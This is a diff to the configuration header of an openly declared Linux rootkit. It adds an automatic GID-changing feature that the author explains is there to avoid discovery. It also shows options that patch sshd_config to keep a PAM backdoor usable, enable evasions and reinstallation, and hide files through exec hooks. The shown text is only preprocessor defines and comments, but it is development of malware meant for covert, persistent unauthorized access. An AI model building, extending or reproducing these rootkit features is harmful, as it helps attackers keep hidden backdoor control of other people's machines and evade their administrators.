@@ -25,22 +25,31 @@
 #define DO_REINSTALL //ignore
 #define DO_EVASIONS //ignore
 
+
 /* the magic GID will not be a static value. there are backdoor commands
- * available for refreshing the rootkit's current GID & hiding its files.
+ * available for refreshing the rootkit's current GID & subsequently rehiding
+ * its files.
  *
  * files you have personally created that do not technically belong to the
  * rootkit will not be rehidden. if i discover a way of efficiently & sanely
- * keeping track of files created in the backdoor then great. until then this
- * will continue to be the way it is.
+ * keeping track of files created (by you) in the backdoor then great. until
+ * then this will continue to be the way it is.
  *
  * if the file cannot be read for whatever reason, the original (MAGIC_GID)
  * value will be used instead.. if this is the case, should rootkit files need
  * rehidden due to GID changes, that will be handled. */
 #define READ_GID_FROM_FILE
 
+/* change the rootkit GID every minimum of GID_CHANGE_MINTIME seconds.
+ * the GID will not be changed if rootkit processes are still running.
+ * otherwise there is a chance we may be discovered. */
+#define AUTO_GID_CHANGER
+#define GID_CHANGE_MINTIME 60 * 30 // change GID at least every 30 mins.
+
 /* for use with USE_PAM_BD. makes sure UsePAM & PasswordAuthentication
  * stay enabled on the box's sshd_config. */
 #define PATCH_SSHD_CONFIG
+
 
 /* this defines whether or not a backdoor user can hide & unhide
  * files on-the-fly via the exec hooks. (execve & execvp)
